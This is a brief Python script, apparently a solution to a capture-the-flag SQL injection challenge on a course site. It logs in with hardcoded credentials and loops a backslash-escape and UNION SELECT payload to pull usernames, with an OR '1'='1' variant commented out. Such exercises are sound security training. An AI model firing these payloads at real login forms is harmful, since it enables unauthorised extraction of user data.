import requests, sys

loginpayload = {"login": "alexrose" , "pwd":"asdfqwerzxcv" }

session = requests.Session()

url = "http://cs495.oregonctf.org/login"

response = session.post(url, data=loginpayload)

targetUrl = "http://cs495.oregonctf.org/challenges/1feccf2205b4c5ddf743630b46aece3784d61adc56498f7603ccd7cb8ae92629"

for x in range(0,20):
    username="anything\\"
    password="UNION SELECT username from users where idusers = \"%d\" -- " % (x) #"OR \"1\" = \"1\" --

    postData = {"theUserName":username,"thePassword": password}
    response2 = session.post(targetUrl, data=postData)
    print(response2.text)
